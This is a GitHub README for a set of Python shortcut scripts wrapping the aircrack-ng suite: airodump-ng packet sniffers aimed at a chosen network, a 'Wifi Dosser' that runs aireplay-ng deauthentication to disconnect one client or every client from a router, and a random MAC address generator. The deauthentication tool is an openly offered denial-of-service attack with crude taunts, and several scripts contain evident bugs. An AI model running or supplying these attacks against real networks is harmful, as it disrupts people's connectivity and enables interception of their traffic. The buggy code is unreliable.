# Kali-Linux-Wifi-Short-Cut-Scripts
These scripts consist of an easier, shorter way to do things via wireless attacks using Aircrack-ng suite of network tools. Make sure to give credit to __Thomas d'Otreppe de Bouvette__ [here](https://twitter.com/aircrackng?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor) for original code.                        

#files included
For Scanning network traffic
-------------------------------------
FILE: [__sniff_traffic.py__](https://github.com/scriptedp0ison/Kali-Linux-Wifi-Short-Cut-Scripts/blob/master/sniff_traffic.py)

USE: Scan *most traffic* on specified NIC using airodump-ng (monitor mode must be enabled, may give error on NIC with promiscuous mode enabled)

```python
import sys
import subprocess
import time
from datetime import  datetime


def get_network_data():
    st = datetime.now()
    print('[+] Started on %s/%s/%s %s:%s:%s' % (st.month, st.day, st.year, st.hour, st.minute, st.second))
    get_traffic = raw_input('[+] Start sniffing network traffic(y/n): ')
    if get_traffic == 'y' or get_traffic == 'yes':
        print('[+] Sniffing traffic on wireless network card...')
	get_card = raw_input('[+] Enter interface to sniff traffic on: ')
        call_command = 'airodump-ng {}'.format(get_card)
	subprocess.call(call_command, shell=True)
    if get_traffic == 'n' or get_traffic == 'no':
        print('[!] Not sniffing traffic! Exitting...')
        time.sleep(3)
        exit()

get_network_data()
```


For Scanning traffic specific network
--------------------------------------
FILE: [__get_client.py__](https://github.com/scriptedp0ison/Kali-Linux-Wifi-Short-Cut-Scripts/blob/master/get_client.py)

USE: Scan *most traffic* on specified network using airodump-ng (monitor mode must be enabled, may give error on NIC with promiscuous mode enabled)

This can be used to *directly monitor* 802.11 traffic

```python
import subprocess
import sys
import time
from datetime import datetime

#print(sys.argv[0])
print(""" 
Wifi Packet Sniffer v0.1
-------------------------------
Options:
	-c 	Channel to listen on
	-m	Target address
	-i 	Interface to use
Credits:
	Re-scripted by scriptedp0ison
	Original program airodump-ng created by Thomas d'Otreppe
	Visit http://www.aircrack-ng.org for more info
""")

if sys.argv > 1 and sys.argv > 2 and sys.argv > 3 and sys.argv > 4 and sys.argv > 5 and sys.argv > 6:
	#subprocess.call(sys.argv[1], shell=True)
	print('[+] Channel set to: {}'.format(sys.argv[2]))
	time.sleep(2)
	print('[+] Target mac set to: {}'.format(sys.argv[4]))
	time.sleep(2)
	print('[+] Network card set to listen on: {}'.format(sys.argv[6]))
	time.sleep(2)
	print('[+] Compiling system arguments...')
	time.sleep(1)
	print('[+] Executing system arguments...')
	time.sleep(2)
	launch_attack = 'airodump-ng -c {} --bssid {} {}'.format(sys.argv[2], sys.argv[4], sys.argv[6])
	subprocess.call(launch_attack, shell=True)
if sys.argv[1] == '-h' or sys.argv[1] == '-help' or sys.argv[1] == '--help':
	print(""" Wifi Dosser v0.1 - Do not use for illegal purposes! Do not test on networks you dont own or have permission to test!
		_____________________________________________________________________________________________________________________
	Options:
	-h	Display the help screen
	-m	Target MAC Address
	-c	channel to listen on
	-i	Network Interface card
	Examples:
		python get_client.py -c <channel to listen on> -m <target mac address> -i <NIC>
	""")

```

For Scanning traffic specific network
--------------------------------------
FILE: [__get_client_easy.py__](https://github.com/scriptedp0ison/Kali-Linux-Wifi-Short-Cut-Scripts/blob/master/get_client_easy.py)

USE: Scan *most traffic* on specified network using airodump-ng (monitor mode must be enabled, may give error on NIC with promiscuous mode enabled)

```python
import sys
import time
import subprocess

class GetSniffer:
	def __init__(self, channel, mac, card):
		self.channel = channel
		self.mac = mac
		self.interface = interface


	@classmethod
	def get_target_channel(cls):
		cls.channel = int(input('[+] Enter channel to listen on: '))
		print('[+] Channel set to: {}'.format(cls.channel))

	@classmethod
	def get_mac_address(cls):
		cls.mac = int(input('[+] Enter target mac address: '))
		if(len(cls.mac) != 17):
			print('[!] Invalid mac address length!')
			time.sleep(2)
			GetSniffer.get_mac_address()
		elif(len(cls.mac) == str(17)):
			print('[+] Mac address set to: {}'.format(cls.mac))


	@classmethod
	def get_network_card(cls):
		cls.card = input('[+] Enter network card: ')
		time.sleep(1)
		print('[+] Network card set to: {}'.format(cls.card))


	@classmethod
	def launch_passive_sniffing(cls):
		print('[+] Starting sniffing session...')
		time.sleep(3)
		launch_sniffer = 'airodump-ng -c {} --bssid {} {}'.format(cls.channel, cls.mac, cls.card)
		subprocess.call(launch_sniffer, shell=True)

GetSniffer.get_target_channel()
GetSniffer.get_mac_address()
GetSniffer.get_network_card()
GetSniffer.launch_passive_sniffing()
```


For Deauthentication attacks (IEEE 802.11) NOTE: *IEEE 802.11w is more secure!*
--------------------------------------
FILE: [__wifi_dosser.py__](https://github.com/scriptedp0ison/Kali-Linux-Wifi-Short-Cut-Scripts/blob/master/wifi_dosser.py)

USE: Send deauthentication packets to client connected to router, or to all clients on router



```python
import time
import subprocess
from datetime import datetime

#start program
class DeauthenticationAttack:
	def __init__(self, option, mac_address, kick_client, kick_all, iface, router_bssid_one, router_bssid_two, iface_one, iface_two):
		self.option = option
		self.mac_address
		self.kick_client = kick_client
		self.kick_all = kick_all
		self.iface = iface
		self.router_bssid_one = router_bssid_one
		self.router_bssid_two = router_bssid_two
		self.iface_one = iface_one
		self.iface_two = iface_two

	@classmethod
	def kick_client_from_router(cls):
		cls.router_bssid_one = raw_input('[+] Enter BSSID of router: ')
		print('[+] Router MAC address set to: {}'.format(cls.router_bssid_one))
		time.sleep(2)
		cls.kick_client = raw_input('[+] Enter client MAC address to kick: ')
		print('[+] Client MAC address set to: {}'.format(cls.kick_client))
		cls.iface_one = raw_input('[+] Enter interface')
		print('[+] Interface set to: {}'.format(cls.iface_one))
		launch_attack = raw_input('[+] Attack ready to launch! Launch attack(y/n): ')
		if(launch_attack == 'y') or (launch_attack == 'yes'):
			print('[+] Shits about to get realz...')
			time.sleep(3)
			launch_dos_attack = 'aireplay-ng -0 0 -a {} -c {} {}'.format(cls.router_bssid_one, cls.kick_client,
															cls.iface_one)
			subprocess.call(launch_dos_attack, shell=True)
		elif(launch_attack == 'n') or (launch_attack == 'no'):
			print('[+] Ahh what a waste of time you sissy ass bitch! Bye...dont come back \#LuLz')
			time.sleep(3)
			exit()
	@classmethod
	def kick_all_from_router(cls):
		cls.router_bssid_two = raw_input('[+] Enter BSSID of router: ')
		cls.iface_two = raw_input('[+] Enter interface to use: ')
		print('[+] Interface set to: {}'.format(cls.iface_two))
		launch_the_attack = raw_input('[+] Attack ready to launch! Launch attack(y/n): ')
		if(launch_the_attack == 'y') or (launch_the_attack == 'yes'):
			print('[+] Shits about to get realz...')
			time.sleep(3)
			launch_da_dos_attack = 'aireplay-ng -0 0 -a {} {}'.format(cls.router_bssid_two, cls.iface_two)
			subprocess.call(launch_da_dos_attack, shell=True)

	@classmethod
	def get_option(cls):
		print(""" 
		Wifi Dosser v0.1
		---------------------------
		1.) Kick a client
		2.) Kick all from router
		""")
		cls.option = raw_input('[+] Select an option from above: ')
		if(cls.option == str(1)):
			print('[+] Option set to: 1')
			time.sleep(2)
			DeauthenticationAttack.kick_client_from_router()
		elif(cls.option == str(2)):
			print('[+] Option set to: 2')
			time.sleep(2)
			DeauthenticationAttack.kick_all_from_router()



DeauthenticationAttack.get_option()
#end program
```

For random Media Access Control Generation
------------------------------------------
FILE: [__mac_address_generator.py__](https://github.com/scriptedp0ison/Kali-Linux-Wifi-Short-Cut-Scripts/blob/master/mac_address_generator.py)

USE: Generate a random Media Access Control(MAC) address. 

```python
import random
import sys
import time

def generate_random_mac_address():
	try:
		mac_letters_first = ['A', 'B', 'C', 'D', 'E', 'F']
		mac_numbers_first = [1, 2, 4, 5, 6, 7, 8, 9, 0]

		mac_letters_second = ['A', 'B', 'C', 'D', 'E', 'F']
		mac_numbers_second = [1, 2, 4, 5, 6, 7, 8, 9, 0]

		mac_letters_third = ['A', 'B', 'C', 'D', 'E', 'F']
		mac_numbers_third = [1, 2, 4, 5, 6, 7, 8, 9, 0]

		mac_letters_fourth = ['A', 'B', 'C', 'D', 'E', 'F']
		mac_numbers_fourth = [1, 2, 4, 5, 6, 7, 8, 9, 0]

		mac_letters_fifth = ['A', 'B', 'C', 'D', 'E', 'F']
		mac_numbers_fifth = [1, 2, 4, 5, 6, 7, 8, 9, 0]

		mac_letters_sixth = ['A', 'B', 'C', 'D', 'E', 'F']
		mac_numbers_sixth = [1, 2, 4, 5, 6, 7, 8, 9, 0]

		gen_rand_alpha_first = random.randrange(0, 5)
		gen_rand_num_first = random.randrange(0, 8)

		gen_rand_alpha_second = random.randrange(0, 5)
		gen_rand_num_second = random.randrange(0, 8)

		gen_rand_alpha_third = random.randrange(0, 5)
		gen_rand_num_third = random.randrange(0, 8)

		gen_rand_alpha_fourth = random.randrange(0, 5)
		gen_rand_num_fourth = random.randrange(0, 8)

		gen_rand_alpha_fifth = random.randrange(0, 5)
		gen_rand_num_fifth = random.randrange(0, 8)

		gen_rand_alpha_sixth = random.randrange(0, 5)
		gen_rand_num_sixth = random.randrange(0, 8)

		result = '{}{}:{}{}:{}{}:{}{}:{}{}:{}{}'.format(mac_letters_first[gen_rand_alpha_first], mac_numbers_first[gen_rand_num_first], 
                                                		mac_numbers_second[gen_rand_num_second], mac_letters_second[gen_rand_alpha_second], 
                                                		mac_letters_third[gen_rand_alpha_third], mac_numbers_third[gen_rand_num_third], 
                                                		mac_letters_fourth[gen_rand_alpha_fourth], mac_numbers_fourth[gen_rand_num_fourth],
                                                		mac_numbers_fifth[gen_rand_alpha_fifth], mac_letters_fifth[gen_rand_num_fifth], 
                                                		mac_letters_sixth[gen_rand_num_sixth], mac_letters_sixth[gen_rand_alpha_sixth])
	except IndexError:
		print('[+] Retrying...')
		time.sleep(1)
		generate_random_mac_address()
	else:
		print('[+] Your MAC address is: %s' % result)
		print('[+] Author: scriptedp0ison')
def exit_generator():
	print('[+] Exitting...')
	time.sleep(3)
	exit()

def get_random_mac():
	print(''' 
	Media Access Control Address Random Generator
	--------------------------------------------
	Author: Scriptedp0ison
	Options:
	1. Generate Random MAC address
	2. Exit
	--------------------------------------------
		''')
	get_mac = raw_input('[+] Enter option: ')
	if(get_mac == str(1)):
		generate_random_mac_address()
	elif(get_mac == str(2)):
		exit_generator()
	elif(get_mac != str(1)) or (get_mac != str(2)):
		print('[+] Invalid option!')
		time.sleep(3)
		get_random_mac()

get_random_mac()
```





